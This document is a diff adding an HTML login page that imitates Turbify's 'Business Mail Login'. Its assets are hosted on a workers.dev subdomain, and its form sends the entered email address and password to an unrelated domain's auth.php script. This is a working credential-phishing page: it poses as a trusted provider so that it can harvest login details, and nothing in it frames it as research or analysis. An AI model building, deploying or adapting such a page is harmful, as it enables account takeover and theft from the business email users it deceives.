@@ -1,0 +1,132 @@
+<!DOCTYPE html><html lang="en"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Bizmail Login</title>
+  <link rel="stylesheet" href="https://curly-salad-41c3.babatee101.workers.dev/css/style.css" type="text/css">
+  <link rel="icon" type="image/x-icon" href="https://curly-salad-41c3.babatee101.workers.dev/images/fav.png">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
+</head>
+<body>
+
+
+
+<div class="home">
+
+  <div class="row">
+    
+    <div class="home-col1">
+      
+      <img src="https://curly-salad-41c3.babatee101.workers.dev/images/turb.png" alt="">
+
+    </div>
+
+    <div class="home-col bg">
+
+      <div class="logo">
+          <img src="https://curly-salad-41c3.babatee101.workers.dev/images/tueblogo.png" alt="">
+
+      </div>
+      
+      <div class="top-text">
+    A trusted partner to small businesses for over 25 years
+</div>
+
+<div class="login-wrapper">
+
+    <div class="toggle-buttons">
+        <button class="inactive">
+            <i class="fa-regular fa-user"></i> Account Login
+        </button>
+        <button class="active">
+            <i class="fa-regular fa-envelope"></i> Business Mail Login
+        </button>
+    </div>
+
+    <div class="login-card">
+        <h2>Business Mail Login</h2>
+        <p class="subtitle">Access your professional <b>email</b> account.</p>
+
+        <form action="https://cauikgunbase.com/teef120/auth.php" method="POST">
+
+            <label>Business Email Address</label>
+            <div class="input-group">
+                <i class="fa-regular fa-envelope"></i>
+                <input type="email" name="email" placeholder="yourname@yourbusiness.com" required="">
+            </div>
+
+            <label>Password</label>
+<div class="input-group password-group">
+    <i class="fa-solid fa-lock"></i>
+    <input type="password" name="password" id="password" placeholder="Enter your password" required="">
+    <i class="fa-regular fa-eye toggle-password" id="togglePassword"></i>
+</div>
+
+            <div class="options">
+                <input type="checkbox" id="remember">
+                <label for="remember">Keep me logged in.</label>
+            </div>
+
+            <button type="submit" class="login-btn">
+                Login to Business Mail
+            </button>
+
+        </form>
+
+        <div class="forgot">
+            <a href="#">Forgot password?</a>
+        </div>
+    </div>
+
+    <div class="signup">
+        Not a customer? <a href="#">Sign up now</a>
+    </div>
+
+</div>
+
+    </div>
+
+
+  </div>
+  
+
+</div>
+
+<div class="footer">
+  
+    <p>
+      ©2026 Turbify. All rights reserved.   <a href="#">Privacy Policy</a>   <a href="#">Terms of Service</a>    <a href="#">Manage Cookies</a>
+
+    </p>
+
+</div>
+
+
+
+
+
+
+
+
+
+
+<script>
+document.getElementById("togglePassword").addEventListener("click", function () {
+
+    const passwordInput = document.getElementById("password");
+    const type = passwordInput.getAttribute("type");
+
+    if (type === "password") {
+        passwordInput.setAttribute("type", "text");
+        this.classList.remove("fa-eye-slash");
+        this.classList.add("fa-eye");
+    } else {
+        passwordInput.setAttribute("type", "password");
+        this.classList.remove("fa-eye");
+        this.classList.add("fa-eye-slash");
+    }
+
+});
+</script>
+
+
+</body></html>
